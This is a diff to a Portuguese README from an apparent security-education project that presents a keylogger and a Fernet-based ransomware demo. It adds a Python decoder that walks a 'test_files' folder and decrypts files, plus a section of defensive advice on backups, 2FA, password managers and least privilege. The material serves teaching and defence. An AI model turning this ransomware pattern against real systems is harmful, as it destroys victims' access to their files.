@@ -105,11 +105,14 @@ with keyboard.Listener(on_press=on_press) as listener:
 
 ## Ransomware.py
 
+
 Preparação
 
 ```bash
 pip install cryptography --break-system-packages 
 ```
+
+### Encoder 
 
 ```python
 from  cryptography.fernet import Fernet
@@ -171,3 +174,75 @@ def main():
 if __name__ =="__main__":
     main()
 ```
+
+### Decoder 
+
+
+```python
+from cryptography.fernet import Fernet
+import os
+
+def carregar_chave():
+    return open ("chave.key", "rb").read()
+
+def descriptografar_arquivo(arquivo,chave):
+    f = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados = file.read()
+        dados_descriptografados = f.decrypt(dados)
+    with open(arquivo, "wb") as file:
+        file.write(dados_descriptografados)
+
+def encontrar_arquivos(diretorio):
+    lista = []
+    for raiz, _, arquivos in os.walk(diretorio):
+        for nome in arquivos:
+            caminho = os.path.join(raiz,nome)
+            if nome != "ransomware.py" and not nome.endswith(".key"):
+                lista.append(caminho)
+    return lista
+
+def main():
+    chave = carregar_chave()
+    arquivos = encontrar_arquivos("test_files")
+    for arquivo in arquivos:
+        descriptografar_arquivo(arquivo, chave)
+    print("Arquivos descriptografados com sucesso!")
+
+if __name__ == "__main__":
+    main ()
+```
+
+# Medidas de proteção/prevenção e defesa
+
+
+### Contra Keyloggers (Captura de Dados)
+
+- Utilize um Gerenciador de Senhas: Use gerenciadores de senhas confiáveis (como LastPass, 1Password ou Bitwarden) para preencher credenciais automaticamente, reduzindo a necessidade de digitá-las, o que dificulta a captura por keyloggers baseados em hooks do teclado.
+
+- Habilite a Autenticação de Dois Fatores (2FA): Mesmo que a senha seja capturada, o 2FA impede o acesso à conta sem o segundo fator (código temporário, token ou chave física).
+
+- Mantenha o Antivírus Atualizado: Softwares antivírus e soluções de EDR (Endpoint Detection and Response) podem identificar e bloquear a execução de keyloggers conhecidos ou seu comportamento suspeito.
+
+- Use Teclados Virtuais: Em dispositivos comprometidos, usar um teclado virtual (na tela) pode burlar keyloggers baseados na captura de eventos do teclado físico.
+
+### Contra Ransomware (Criptografia de Arquivos)
+
+- Realize Backups Regularmente:
+1. Cópias dos seus dados.
+2. Em 2 Mídias de armazenamento diferentes (ex: disco interno e externo).
+3. 1 Cópia Off-site ou Offline (desconectada da rede/nuvem) para que o ransomware não consiga criptografá-la.
+
+- Mantenha o Sistema Operacional e Aplicativos Atualizados: As atualizações corrigem vulnerabilidades de segurança exploradas por malwares para se infiltrarem no sistema.
+
+- Seja Cauteloso com E-mails e Downloads: Nunca abra anexos ou clique em links de e-mails de remetentes desconhecidos ou suspeitos, pois são o vetor de ataque mais comum para ransomware.
+
+- Utilize Contas de Usuário com Menos Privilégios (Standard User): Limitar as permissões de acesso do usuário no dia a dia impede que o ransomware se espalhe para áreas críticas do sistema ou rede.
+
+### Boas Práticas Gerais
+
+- Educação em Segurança: A conscientização do usuário é a principal linha de defesa.
+
+- Firewall: Mantenha o firewall do sistema operacional (ou de rede) ativo para monitorar e bloquear tráfego suspeito.
+
+- Monitoramento de Processos: Fique atento a processos desconhecidos consumindo recursos do sistema de forma atípica.
